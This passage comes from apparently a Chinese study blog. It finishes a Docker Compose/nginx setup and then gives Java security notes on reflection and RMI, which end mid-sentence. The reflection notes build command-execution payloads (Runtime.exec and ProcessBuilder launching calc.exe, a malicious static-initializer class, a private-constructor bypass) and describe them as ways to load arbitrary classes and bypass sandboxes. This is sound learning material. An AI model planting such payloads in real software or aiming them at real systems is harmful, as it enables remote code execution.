nginx:</span><br><span class=\"line\">   image: nginx</span><br><span class=\"line\">   ports:</span><br><span class=\"line\">    - <span class=\"number\">80</span>:<span class=\"number\">80</span></span><br><span class=\"line\">   links:</span><br><span class=\"line\">    - app</span><br><span class=\"line\">   volumes:</span><br><span class=\"line\">    - ./nginx/conf.d:/etc/nginx/conf.d</span><br><span class=\"line\">  app:</span><br><span class=\"line\">    image: app</span><br><span class=\"line\">    <span class=\"keyword\">expose</span>:</span><br><span class=\"line\">      - <span class=\"string\">&quot;8080&quot;</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>创建.&#x2F;nginx&#x2F;conf.d目录</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">mkdir -p ./nginx/conf.d</span><br></pre></td></tr></table></figure>\n\n\n\n<ol start=\"4\">\n<li>在.&#x2F;nginx&#x2F;conf.d目录下 编写itheima.conf文件</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">server &#123;</span><br><span class=\"line\">    listen 80;</span><br><span class=\"line\">    access_log off;</span><br><span class=\"line\"></span><br><span class=\"line\">    location / &#123;</span><br><span class=\"line\">        proxy_pass http://app:8080;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">   </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li>在~&#x2F;docker-compose 目录下 使用docker-compose 启动容器</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker-compose up</span><br></pre></td></tr></table></figure>\n\n<ol start=\"6\">\n<li>测试访问</li>\n</ol>\n<h3 id=\"7、私有镜像\"><a href=\"#7、私有镜像\" class=\"headerlink\" title=\"7、私有镜像\"></a>7、私有镜像</h3><p>略</p>\n<h3 id=\"8、Docker容器虚拟化与传统虚拟机相比\"><a href=\"#8、Docker容器虚拟化与传统虚拟机相比\" class=\"headerlink\" title=\"8、Docker容器虚拟化与传统虚拟机相比\"></a>8、Docker容器虚拟化与传统虚拟机相比</h3><p><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301161119318.png\" alt=\"image-20230301161119318\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301161129373.png\" alt=\"image-20230301161129373\"></p>\n","tags":["docker"]},{"title":"java安全学习","url":"/2023/03/21/java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/","content":"<p><a href=\"https://github.com/phith0n/JavaThings\">phith0n&#x2F;JavaThings: Share Things Related to Java - Java安全漫谈笔记相关内容 (github.com)</a></p>\n<p><a href=\"https://huaweicloud.csdn.net/63a56185b878a54545945a4d.html\">CTFSHOW web入门 java反序列化篇（更新中）_java_yu22x-DevPress官方社区 (csdn.net)</a></p>\n<p><a href=\"https://space.bilibili.com/2142877265/channel/collectiondetail?sid=29805&ctype=0\">https://space.bilibili.com/2142877265/channel/collectiondetail?sid=29805&amp;ctype=0</a></p>\n<p><a href=\"https://www.anquanke.com/post/id/261724\">URLDNS链&amp;CommonsCollections链详细分析-安全客 - 安全资讯平台 (anquanke.com)</a></p>\n<h2 id=\"Java的动态特性——反射\"><a href=\"#Java的动态特性——反射\" class=\"headerlink\" title=\"Java的动态特性——反射\"></a>Java的动态特性——反射</h2><p>参考：</p>\n<p><a href=\"https://wx.zsxq.com/dweb2/index/topic_detail/422128255425528\">知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具 (zsxq.com)</a></p>\n<p><a href=\"https://wx.zsxq.com/dweb2/index/columns/2212251881\">知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具 (zsxq.com)</a></p>\n<p>反射是⼤多数语⾔⾥都必不可少的组成部分，对象可以通过反射获取他的类，类可以通过反射拿到所有 ⽅法（包括私有），拿到的⽅法可以调⽤，总之通过“反射”，我们可以将Java这种静态语⾔附加上动态 特性。</p>\n<p>“动态特性”：⼀段代码，改变其中的变量，将会导致这段代码产⽣功能性的变化，称之为动态特性</p>\n<p>下面是一段反射的代码：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">execute</span><span class=\"params\">(String className, String methodName)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\"> <span class=\"type\">Class</span> <span class=\"variable\">clazz</span> <span class=\"operator\">=</span> Class.forName(className);</span><br><span class=\"line\"> clazz.getMethod(methodName).invoke(clazz.newInstance());</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>⼏个在反射⾥极为重要的⽅法：</p>\n<p> 获取类的⽅法： forName </p>\n<p>实例化类对象的⽅法： newInstance </p>\n<p>获取函数的⽅法： getMethod </p>\n<p>执⾏函数的⽅法： invoke</p>\n<p>forName 不是获取“类”的唯⼀途径，通常来说我们有如下三种⽅式获取⼀个“类”，也就 是 java.lang.Class 对象：</p>\n<ol>\n<li>obj.getClass() 如果上下⽂中存在某个类的实例 obj ，那么我们可以直接通过 obj.getClass() 来获取它的类 </li>\n<li>Test.class 如果你已经加载了某个类，只是想获取到它的 java.lang.Class 对象，那么就直接 拿它的 class 属性即可。这个⽅法其实不属于反射。 </li>\n<li>Class.forName 如果你知道某个类的名字，想获取到这个类，就可以使⽤ forName 来获取</li>\n</ol>\n<p>使⽤反射的⼀⼤⽬的，就是绕过某些沙盒。⽐如，上下⽂中如果只有Integer类型的 数字，我们如何获取到可以执⾏命令的Runtime类呢？也许可以这样（伪代 码）： 1.getClass().forName(“java.lang.Runtime”)</p>\n<p>forName有两个函数重载：</p>\n<ul>\n<li><p>Class forName(String name) </p>\n</li>\n<li><p>Class forName(String name, <strong>boolean</strong> initialize, ClassLoader loader)</p>\n</li>\n</ul>\n<p>第⼀个就是我们最常⻅的获取class的⽅式，其实可以理解为第⼆种⽅式的⼀个封装：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Class.forName(className)</span><br><span class=\"line\"><span class=\"comment\">// 等于</span></span><br><span class=\"line\">Class.forName(className, <span class=\"literal\">true</span>, currentLoader)</span><br></pre></td></tr></table></figure>\n\n<p>默认情况下， forName 的第⼀个参数是类名；第⼆个参数表示是否初始化；第三个参数就 是 ClassLoader 。</p>\n<p>ClassLoader 是什么呢？它就是⼀个“加载器”，告诉Java虚拟机如何加载这个类。</p>\n<p>下面是一个类：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">TrainPrint</span> &#123;</span><br><span class=\"line\"> &#123;</span><br><span class=\"line\"> System.out.printf(<span class=\"string\">&quot;Empty block initial %s\\n&quot;</span>, <span class=\"built_in\">this</span>.getClass());</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> <span class=\"keyword\">static</span> &#123;</span><br><span class=\"line\"> System.out.printf(<span class=\"string\">&quot;Static initial %s\\n&quot;</span>, TrainPrint.class);</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> <span class=\"keyword\">public</span> <span class=\"title function_\">TrainPrint</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\"> System.out.printf(<span class=\"string\">&quot;Initial %s\\n&quot;</span>, <span class=\"built_in\">this</span>.getClass());</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">Static initial <span class=\"keyword\">class</span> <span class=\"title class_\">org</span>.example.Main$TrainPrint</span><br><span class=\"line\">Empty block initial <span class=\"keyword\">class</span> <span class=\"title class_\">org</span>.example.Main$TrainPrint</span><br><span class=\"line\">Initial <span class=\"keyword\">class</span> <span class=\"title class_\">org</span>.example.Main$TrainPrint</span><br></pre></td></tr></table></figure>\n\n<p>⾸先调⽤的是 static {} ，其次是 {} ，最后是构造函数。</p>\n<p>其中， static {} 就是在“类初始化”的时候调⽤的，⽽ {} 中的代码会放在构造函数的 super() 后⾯， 但在当前构造函数内容的前⾯。</p>\n<p>forName 中的 initialize&#x3D;true 其实就是告诉Java虚拟机是否执⾏”类初始化“。</p>\n<p>假设我们有如下函数，其中函数的参数name可控：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">ref</span><span class=\"params\">(String name)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\"> Class.forName(name);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>我们就可以编写⼀个恶意类，将恶意代码放置在 static {} 中，从⽽执⾏：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.lang.Runtime;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.Process;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">TouchFile</span> &#123;</span><br><span class=\"line\"> <span class=\"keyword\">static</span> &#123;</span><br><span class=\"line\"> <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\"> <span class=\"type\">Runtime</span> <span class=\"variable\">rt</span> <span class=\"operator\">=</span> Runtime.getRuntime();</span><br><span class=\"line\"> String[] commands = &#123;<span class=\"string\">&quot;touch&quot;</span>, <span class=\"string\">&quot;/tmp/success&quot;</span>&#125;;</span><br><span class=\"line\"> <span class=\"type\">Process</span> <span class=\"variable\">pc</span> <span class=\"operator\">=</span> rt.exec(commands);</span><br><span class=\"line\"> pc.waitFor();</span><br><span class=\"line\"> &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\"> <span class=\"comment\">// do nothing</span></span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>下面是自己写的demo</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> org.example;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.Runtime;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">test</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> IOException, ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException &#123;</span><br><span class=\"line\">        excute(<span class=\"string\">&quot;org.example.hello&quot;</span>,<span class=\"string\">&quot;sayHello&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">excute</span><span class=\"params\">(String className, String methodName)</span> <span class=\"keyword\">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException &#123;</span><br><span class=\"line\">        Class clazz=Class.forName(className);</span><br><span class=\"line\">        clazz.getMethod(methodName).invoke(clazz.newInstance());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">hello</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> String name;</span><br><span class=\"line\">    hello()&#123;</span><br><span class=\"line\">        name=<span class=\"string\">&quot;xcc&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">sayHello</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        System.out.println(name);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在正常情况下，除了系统类，如果我们想拿到一个类，需要先 import 才能使用。而使用forName就不需要，这样对于我们的攻击者来说就十分有利，我们可以加载任意类。</p>\n<p>另外，我们经常在一些源码里看到，类名的部分包含 $ 符号，比如<em>fastjson</em>在 checkAutoType 时候就会 先将$ 替换成 . ：<a href=\"https://github.com/alibaba/fastjson/blob/fcc9c2a/src/main/java/com/alibaba/fa\">https://github.com/alibaba/fastjson/blob/fcc9c2a/src/main/java/com/alibaba/fa</a> stjson&#x2F;parser&#x2F;ParserConfig.java#L1038。 $ 的作用是查找内部类。</p>\n<p>Java的普通类 C1 中支持编写内部类 C2 ，而在编译的时候，会生成两个文件： C1.class 和 C1$C2.class ，我们可以把他们看作两个无关的类，通过 Class.forName(“C1$C2”) 即可加载这个内 部类。</p>\n<p><a href=\"https://www.jianshu.com/p/b10d006a14fd\">Java 反射内部类 - 简书 (jianshu.com)</a></p>\n<p>下面是自己写的demo：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> org.example;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.Runtime;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">test</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> IOException, ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException &#123;</span><br><span class=\"line\">        excute(<span class=\"string\">&quot;org.example.test$hello&quot;</span>,<span class=\"string\">&quot;sayHello&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">excute</span><span class=\"params\">(String className, String methodName)</span> <span class=\"keyword\">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException &#123;</span><br><span class=\"line\">        Class clazz=Class.forName(className);</span><br><span class=\"line\">        clazz.getMethod(methodName).invoke(clazz.newInstance());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">static</span> <span class=\"keyword\">class</span> <span class=\"title class_\">hello</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> String name;</span><br><span class=\"line\">        hello()&#123;</span><br><span class=\"line\">            name=<span class=\"string\">&quot;xcc&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">sayHello</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">            System.out.println(name);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>class.newInstance() 的作用就是调用这个类的无参构造函数，这个比较好理解。不过，我们有时候 在写漏洞利用方法的时候，会发现使用 newInstance 总是不成功，这时候原因可能是： </p>\n<ol>\n<li>你使用的类没有无参构造函数 </li>\n<li>你使用的类构造函数是私有的</li>\n</ol>\n<p>最常见的情况就是 java.lang.Runtime ，这个类在我们构造命令执行Payload的时候很常见，但 我们不能直接这样来执行命令：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">Class</span> <span class=\"variable\">clazz</span> <span class=\"operator\">=</span> Class.forName(<span class=\"string\">&quot;java.lang.Runtime&quot;</span>);</span><br><span class=\"line\">clazz.getMethod(<span class=\"string\">&quot;exec&quot;</span>, String.class).invoke(clazz.newInstance(), <span class=\"string\">&quot;id&quot;</span>);</span><br></pre></td></tr></table></figure>\n\n<p>原因是 Runtime 类的构造方法是私有的。</p>\n<p>类的私有原因设计到一种设计模式“单例模式”。</p>\n<p>比如，对于Web应用来说，数据库连接只需要建立一次，而不是每次用到数据库的时候再新建立一个连 接，此时作为开发者你就可以将数据库连接使用的类的构造函数设置为私有，然后编写一个静态方法来 获取：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">TrainDB</span> &#123;</span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"type\">TrainDB</span> <span class=\"variable\">instance</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">TrainDB</span>();</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> TrainDB <span class=\"title function_\">getInstance</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\"><span class=\"keyword\">return</span> instance;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"title function_\">TrainDB</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">\t<span class=\"comment\">// 建立连接的代码...</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这样，只有类初始化的时候会执行一次构造函数，后面只能通过 getInstance 获取这个对象，避免建立多个数据库连接。</p>\n<p>Runtime类就是单例模式，我们只能通过 Runtime.getRuntime() 来获取到 Runtime 对 象。我们将上述Payload进行修改即可正常执行命令了：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">Class</span> <span class=\"variable\">clazz</span> <span class=\"operator\">=</span> Class.forName(<span class=\"string\">&quot;java.lang.Runtime&quot;</span>);</span><br><span class=\"line\">clazz.getMethod(<span class=\"string\">&quot;exec&quot;</span>,</span><br><span class=\"line\">String.class).invoke(clazz.getMethod(<span class=\"string\">&quot;getRuntime&quot;</span>).invoke(clazz),</span><br><span class=\"line\"><span class=\"string\">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure>\n\n<p>这里用到了 getMethod 和 invoke 方法。 getMethod 的作用是通过反射获取一个类的某个特定的公有方法。而学过Java的同学应该清楚，Java中 支持类的重载，我们不能仅通过函数名来确定一个函数。所以，在调用 getMethod 的时候，我们需要 传给他你需要获取的函数的参数类型列表。</p>\n<p>Runtime.exec 方法有6个重载：</p>\n<p>使用最简单的，也就是第一个，它只有一个参数，类型是String，所以我们使用 getMethod(“exec”, String.class) 来获取 Runtime.exec 方法。</p>\n<p>invoke 的作用是执行方法，它的第一个参数是： </p>\n<ul>\n<li><p>如果这个方法是一个普通方法，那么第一个参数是类对象</p>\n</li>\n<li><p>如果这个方法是一个静态方法，那么第一个参数是类</p>\n</li>\n</ul>\n<p>这也比较好理解了，我们正常执行方法是 [1].method([2], [3], [4]…) ，其实在反射里就是 method.invoke([1], [2], [3], [4]…) 。</p>\n<p>将上述命令执行的Payload分解一下就是：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">Class</span> <span class=\"variable\">clazz</span> <span class=\"operator\">=</span> Class.forName(<span class=\"string\">&quot;java.lang.Runtime&quot;</span>);</span><br><span class=\"line\"><span class=\"type\">Method</span> <span class=\"variable\">execMethod</span> <span class=\"operator\">=</span> clazz.getMethod(<span class=\"string\">&quot;exec&quot;</span>, String.class);</span><br><span class=\"line\"><span class=\"type\">Method</span> <span class=\"variable\">getRuntimeMethod</span> <span class=\"operator\">=</span> clazz.getMethod(<span class=\"string\">&quot;getRuntime&quot;</span>);</span><br><span class=\"line\"><span class=\"type\">Object</span> <span class=\"variable\">runtime</span> <span class=\"operator\">=</span> getRuntimeMethod.invoke(clazz);</span><br><span class=\"line\">execMethod.invoke(runtime, <span class=\"string\">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure>\n\n<p>现在有两个问题：</p>\n<ul>\n<li><p>如果一个类没有无参构造方法，也没有类似单例模式里的静态方法，我们怎样通过反射实例化该类 呢？ </p>\n</li>\n<li><p>如果一个方法或构造方法是私有方法，我们是否能执行它呢？</p>\n</li>\n</ul>\n<p>下面在回答。</p>\n<p><strong>第一个问题</strong>，我们需要用到一个新的反射方法 getConstructor 。</p>\n<p> 和 getMethod 类似， getConstructor 接收的参数是构造函数列表类型，因为构造函数也支持重载， 所以必须用参数列表类型才能唯一确定一个构造函数。</p>\n<p> 获取到构造函数后，我们使用 newInstance 来执行。</p>\n<p> 比如，我们常用的另一种执行命令的方式ProcessBuilder，我们使用反射来获取其构造函数，然后调用 start() 来执行命令：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">Class</span> <span class=\"variable\">clazz</span> <span class=\"operator\">=</span> Class.forName(<span class=\"string\">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class=\"line\">((ProcessBuilder)</span><br><span class=\"line\">clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class=\"string\">&quot;calc.exe&quot;</span>))).start();</span><br></pre></td></tr></table></figure>\n\n<p>ProcessBuilder有两个构造函数：</p>\n<ul>\n<li><p>public ProcessBuilder(List command) </p>\n</li>\n<li><p>public ProcessBuilder(String… command)</p>\n</li>\n</ul>\n<p>我上面用到了第一个形式的构造函数，所以我在 getConstructor 的时候传入的是 List.class 。</p>\n<p> 但是，我们看到，前面这个Payload用到了Java里的强制类型转换，有时候我们利用漏洞的时候（在表达式上下文中）是没有这种语法的。</p>\n<p>所以，我们仍需利用反射来完成这一步。</p>\n<p>代码如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">Class</span> <span class=\"variable\">clazz</span> <span class=\"operator\">=</span> Class.forName(<span class=\"string\">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class=\"line\">clazz.getMethod(<span class=\"string\">&quot;start&quot;</span>).invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class=\"string\">&quot;calc.exe&quot;</span>)));</span><br></pre></td></tr></table></figure>\n\n<p>通过 getMethod(“start”) 获取到start方法，然后 invoke 执行， invoke 的第一个参数就是ProcessBuilder Object了。</p>\n<p><strong>第二个问题</strong></p>\n<p>getDeclared 系列的反射了，与普通的 getMethod 、 getConstructor 区别是：</p>\n<ul>\n<li>getMethod 系列方法获取的是当前类中所有公共方法，包括从父类继承的方法</li>\n<li>getDeclaredMethod 系列方法获取的是当前类中“声明”的方法，是实在写在这个类里的，包括私 有的方法，但从父类里继承来的就不包含了</li>\n</ul>\n<p>getDeclaredMethod 的具体用法和 getMethod 类似， getDeclaredConstructor 的具体用法和 getConstructor 类似。</p>\n<p>过Runtime这个类的构造函数是私有的，我们需要用 Runtime.getRuntime() 来 获取对象。其实现在我们也可以直接用 getDeclaredConstructor 来获取这个私有的构造方法来实例 化对象，进而执行命令：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">Class</span> <span class=\"variable\">clazz</span> <span class=\"operator\">=</span> Class.forName(<span class=\"string\">&quot;java.lang.Runtime&quot;</span>);</span><br><span class=\"line\"><span class=\"type\">Constructor</span> <span class=\"variable\">m</span> <span class=\"operator\">=</span> clazz.getDeclaredConstructor();</span><br><span class=\"line\">m.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">clazz.getMethod(<span class=\"string\">&quot;exec&quot;</span>, String.class).invoke(m.newInstance(), <span class=\"string\">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure>\n\n<p><a href=\"https://developer.aliyun.com/article/330847\">反射setAccessible()方法-阿里云开发者社区 (aliyun.com)</a></p>\n<h2 id=\"RMI\"><a href=\"#RMI\" class=\"headerlink\" title=\"RMI\"></a>RMI</h2><p><a href=\"https://wx.zsxq.com/dweb2/index/columns/2212251881\">知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具 (zsxq.com)</a></p>\n<p>RMI全称是Remote Method Invocation，远程⽅法调⽤。从这个名字就可以看出，他的⽬标和RPC其实 是类似的，是让某个Java虚拟机上的对象调⽤另⼀个Java虚拟机中对象上的⽅法，只不过RMI是Java独 有的⼀种机制。</p>\n<p>⼀个例⼦</p>\n<p>RMI Server:</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> org.example;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.rmi.Naming;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.rmi.Remote;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.rmi.RemoteException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.rmi.registry.LocateRegistry;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.rmi.registry.Registry;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">RMIServer</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">interface</span> <span class=\"title class_\">IRemoteHelloWorld</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">Remote</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> String <span class=\"title function_\">hello</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> RemoteException;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">RemoteHelloWorld</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">UnicastRemoteObject</span> <span class=\"keyword\">implements</span></span><br><span class=\"line\">            <span class=\"title class_\">IRemoteHelloWorld</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> <span class=\"title function_\">RemoteHelloWorld</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> RemoteException &#123;</span><br><span class=\"line\">            <span class=\"built_in\">super</span>();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> String <span class=\"title function_\">hello</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> RemoteException &#123;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;call from&quot;</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">&quot;Hello world&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title function_\">start</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">RemoteHelloWorld</span> <span class=\"variable\">h</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">RemoteHelloWorld</span>();</span><br><span class=\"line\">        LocateRegistry.createRegistry(<span class=\"number\">1099</span>);</span><br><span class=\"line\">        Naming.rebind(<span class=\"string\">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>, h);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">RMIServer</span>().start();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>⼀个RMI Server分为三部分：</p>\n<ul>\n<li>⼀个继承了 java.rmi.Remote 的接⼝，其中定义我们要远程调⽤的函数，⽐如这⾥的 hello() </li>\n<li>⼀个实现了此接⼝的类 </li>\n<li>⼀个主类，⽤来创建Registry，并将上⾯的类实例化后绑定到⼀个地址。这就是我们所谓的Server 了</li>\n</ul>\n<p>RMI Client：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> org.example;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> org.example.RMIServer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.rmi.Naming;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.rmi.NotBoundException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.rmi.RemoteException;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">TrainMain</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        RMIServer.<span class=\"type\">IRemoteHelloWorld</span> <span class=\"variable\">hello</span> <span class=\"operator\">=</span> (RMIServer.IRemoteHelloWorld)</span><br><span class=\"line\">                Naming.lookup(<span class=\"string\">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">ret</span> <span class=\"operator\">=</span> hello.hello();</span><br><span class=\"line\">        System.out.println( ret);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>客户端就简单多了，使⽤ Naming.lookup 在Registry中寻找到名字是Hello的对象，后⾯的使⽤就和在 